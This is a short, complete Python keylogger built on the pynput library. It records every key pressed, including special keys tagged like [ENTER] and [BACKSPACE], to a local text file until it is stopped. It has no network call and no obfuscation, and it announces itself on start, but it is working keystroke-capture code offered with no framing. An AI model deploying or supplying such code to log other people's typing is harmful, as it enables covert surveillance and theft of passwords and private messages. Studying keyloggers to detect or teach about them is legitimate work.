from pynput import keyboard
from datetime import datetime


log_file = "key_log.txt"


def write_to_file(key):
    try:
        with open(log_file, "a") as f:
            
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                if key == keyboard.Key.space:
                    f.write(' [SPACE] ')
                elif key == keyboard.Key.enter:
                    f.write('\n[ENTER]\n')
                elif key == keyboard.Key.backspace:
                    f.write(' [BACKSPACE] ')
                else:
                    f.write(f' [{key.name.upper()}] ')
    except Exception as e:
        print(f"Error writing to file: {e}")


def on_press(key):
    write_to_file(key)


def main():
    print("Keylogger is running... Press Ctrl+C to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
